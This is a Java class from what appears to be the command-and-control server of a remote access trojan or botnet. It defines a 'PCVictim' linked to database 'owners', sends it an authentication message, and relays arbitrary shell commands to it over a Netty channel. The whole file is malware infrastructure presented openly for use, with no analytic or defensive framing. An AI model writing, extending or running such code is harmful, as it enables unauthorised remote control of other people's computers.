import io.netty.channel.ChannelHandlerContext;
import org.json.simple.JSONObject;

public class PCVictim extends Victim {

    public PCVictim(ChannelHandlerContext context, String name) {
        this.context = context;
        this.name = name;
        this.owners = NettyServer.getDBManager().DBUsers.getOwnersByVictim(name);
    }

    public void sendAuthPCVictim() {
        JSONObject query = new JSONObject();
        query.put("action", "auth.pcvictim");
        sendMessage(query);
    }

    public void sendCmd(String command, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "cmd");
        query.put("command", command);
        query.put("owner", owner);
        sendMessage(query);
    }

}
